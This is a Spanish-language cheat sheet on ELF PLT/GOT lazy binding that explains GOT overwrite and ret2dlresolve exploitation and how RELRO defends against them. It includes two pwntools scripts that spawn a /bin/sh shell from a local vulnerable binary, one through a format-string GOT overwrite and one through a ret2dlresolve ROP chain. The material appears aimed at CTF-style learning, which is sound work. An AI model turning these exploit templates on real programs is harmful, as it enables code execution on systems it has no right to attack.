# GOT / PLT y lazy binding (cheat sheet)

Como un ELF dinamico resuelve funciones de libc en runtime, y por que eso es un objetivo de
explotacion. Base de GOT overwrite y de ret2dlresolve ([[advanced-rop]]).

## PLT y GOT
- PLT (.plt): trampolin por funcion importada. `call puts@plt` salta a una entrada PLT.
- GOT (.got.plt): tabla de punteros que la PLT lee. Antes de resolver, la GOT apunta de vuelta
  a la PLT (para forzar la resolucion la primera vez); despues, al codigo real en libc.

## Lazy binding (resolucion perezosa)
1. Primera llamada a `func@plt`: la GOT aun apunta a PLT+6 -> empuja el indice de reloc y salta
   a PLT[0].
2. PLT[0] llama a `_dl_runtime_resolve(link_map, reloc_index)`.
3. El resolver: coge la reloc de JMPREL (.rela.plt) en `JMPREL + index`, saca el simbolo de
   SYMTAB (.dynsym) via el campo r_info, y el NOMBRE de STRTAB (.dynstr). Busca la direccion
   real y la ESCRIBE en la GOT.
4. Siguientes llamadas: la GOT ya tiene la direccion -> salto directo, sin resolver.

## GOT overwrite (RCE primitive)
Si tienes escritura (format-string %n, overflow de un puntero, arb write) y la GOT es
escribible (No/Partial RELRO): sobrescribe la entrada de una funcion que se llamara despues
(printf, exit, __stack_chk_fail...) con system/one_gadget.
- Ejemplo clasico: printf@GOT -> system, y luego printf(buf) con buf="/bin/sh" ejecuta system.
- Tambien GOTs INTERNAS de la propia libc (algunas funciones de libc se llaman entre si via su
  GOT) pueden ser objetivo cuando el binario tiene Full RELRO pero la libc no.

## ret2dlresolve (sin leak)
Abusa del paso 3: das un `reloc_index` enorme para que la reloc caiga en memoria que controlas,
y forjas Elf64_Rela + Elf64_Sym + el nombre en STRTAB apuntando a "system". _dl_runtime_resolve
resuelve y llama tu funcion. Requiere GOT escribible (no Full RELRO) y lazy binding activo.

## Ejemplo pwntools: GOT overwrite con format string
```python
from pwn import *
elf = context.binary = ELF("./vuln")     # Partial RELRO, con leak de libc ya obtenido
libc = ELF("./libc.so.6"); libc.address = leak_libc_base
# El printf vulnerable es el 6º argumento en la pila (offset), tipico en x86-64:
offset = 6
# Redirige printf@GOT -> system. En la proxima llamada printf(buf) con buf="/bin/sh" -> shell.
payload = fmtstr_payload(offset, {elf.got["printf"]: libc.sym["system"]}, write_size="short")
io = elf.process()
io.sendline(payload)          # dispara el %n que reescribe la GOT
io.sendline(b"/bin/sh")       # ahora printf("/bin/sh") == system("/bin/sh")
io.interactive()
# Objetivos comunes: printf/puts/exit/__stack_chk_fail@GOT. Elige uno que se llame DESPUES de
# tu escritura y cuyo 1er arg controles (o usa one_gadget si no controlas args).
```

## Ejemplo pwntools: ret2dlresolve (sin leak de libc)
```python
from pwn import *
elf = context.binary = ELF("./vuln")     # Partial RELRO + lazy binding, SIN leak
rop = ROP(elf)
dl  = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
# Lee "/bin/sh" y las structs forjadas (Elf64_Rela/Sym + nombre) a una zona escribible (.bss):
rop.read(0, dl.data_addr)                 # read(0, data_addr, len)
rop.ret2dlresolve(dl)                     # empuja reloc_index y salta a PLT[0]=_dl_runtime_resolve
raw = rop.chain()
io = elf.process()
io.sendline(fit({offset_to_ret: raw}))    # overflow que coloca la cadena ROP
io.sendline(dl.payload)                   # los datos que 'read' escribe en data_addr
io.interactive()
# Idea: das un reloc_index que hace que la reloc caiga en TUS structs; el resolver "resuelve"
# system y lo llama. No necesitas conocer la libc. Falla con Full RELRO (bind now).
```

## RELRO (la defensa)
- Partial RELRO: .got (datos) de solo lectura, pero .got.plt (lazy) sigue escribible -> GOT
  overwrite y ret2dlresolve posibles.
- Full RELRO: bind now (todo resuelto al arranque) + toda la GOT de solo lectura -> no GOT
  overwrite, no ret2dlresolve. Hay que ir por FSOP/exit-handlers/hooks.
- Comprueba con checksec antes de planear.
